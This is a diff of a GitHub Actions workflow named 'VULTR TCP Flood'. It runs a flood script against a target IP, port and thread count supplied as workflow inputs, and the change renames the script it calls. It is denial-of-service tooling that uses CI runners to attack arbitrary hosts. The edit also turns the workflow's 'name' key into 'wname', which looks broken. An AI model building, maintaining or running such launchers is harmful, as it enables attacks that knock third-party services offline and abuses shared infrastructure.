@@ -1,4 +1,4 @@
-name: VULTR TCP Flood
+wname: VULTR TCP Flood
 
 on:
   workflow_dispatch:
@@ -32,4 +32,4 @@ jobs:
         if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
     - name: Starting Flood...
       run: |
-        python vultr.py ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.portgt }} ${{ github.event.inputs.thread }}
+        python vultrtcp.py ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.portgt }} ${{ github.event.inputs.thread }}
